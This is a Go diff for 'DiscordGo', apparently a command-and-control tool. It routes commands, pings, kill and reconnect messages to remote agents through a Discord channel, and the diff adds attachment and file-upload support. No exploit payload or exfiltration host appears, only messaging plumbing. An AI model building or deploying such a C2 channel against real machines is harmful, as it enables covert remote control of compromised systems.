@@ -3,6 +3,7 @@ package message
 import (
 	"DiscordGo/pkg/util/constants"
 	"encoding/json"
+	"strings"
 
 	"github.com/bwmarrin/discordgo"
 )
@@ -17,6 +18,7 @@ const (
 	MESSAGE_NEW Type = iota
 	MESSAGE_KILL Type = iota
 	MESSAGE_DISCONNECT Type = iota
+	MESSAGE_RECONNECT Type = iota
 )
 
 type Message struct {
@@ -24,15 +26,25 @@ type Message struct {
 	MessageType Type
 	Message 	string
 	Server		bool
+	HasAttachment bool
+}
+
+type FileUpload struct {
+	From	string
+	To		string
+	Destination string // where the file should be saved
+	Source 		string // location of file on local machine (DO I need this) 
+
 }
 
 // NewMessage wiill create a new Message struct and convert it json
-func NewMessage(agentID string, message string, fromServer bool, messageType Type) string{
+func NewMessage(agentID string, message string, fromServer bool, hasAttachment bool, messageType Type) string{
 	newMessage := &Message{}
 	newMessage.AgentID = agentID
 	newMessage.Message = message
 	newMessage.MessageType = messageType
 	newMessage.Server = fromServer
+	newMessage.HasAttachment = hasAttachment
 
 	// change to json
 	messageJSON, _ := json.Marshal(newMessage)
@@ -40,17 +52,27 @@ func NewMessage(agentID string, message string, fromServer bool, messageType Typ
 }
 
 func CommandMessage(dg *discordgo.Session, agentID string, command string) {
-	message := NewMessage(agentID, command, true, MESSAGE_COMMAND)
+	command = strings.TrimLeft(command, "cmd")
+	command = strings.TrimSpace(command)
+	message := NewMessage(agentID, command, true, false, MESSAGE_COMMAND)
 	dg.ChannelMessageSend(constants.ChannelID, message)
 
 }
 
-func Ping(dg *discordgo.Session, agentID string){
-	message := NewMessage(agentID, "", true, MESSAGE_PING)
+// Ping is used by both the server and the agent
+// When the server sends a ping,it's to make the agent is still alive
+// When the agents send a ping, it's to make sure the server is up
+func Ping(dg *discordgo.Session, agentID string, fromServer bool){
+	message := NewMessage(agentID, "", fromServer, false, MESSAGE_PING)
+	dg.ChannelMessageSend(constants.ChannelID, message)
+}
+
+func Pong(dg *discordgo.Session, agentID string, fromServer bool){
+	message := NewMessage(agentID, "", fromServer, false, MESSAGE_PONG)
 	dg.ChannelMessageSend(constants.ChannelID, message)
 }
 
 func KillAgent(dg *discordgo.Session, agentID string) {
-	message := NewMessage(agentID, "", true, MESSAGE_KILL)
+	message := NewMessage(agentID, "", true,false, MESSAGE_KILL)
 	dg.ChannelMessageSend(constants.ChannelID, message)
 }
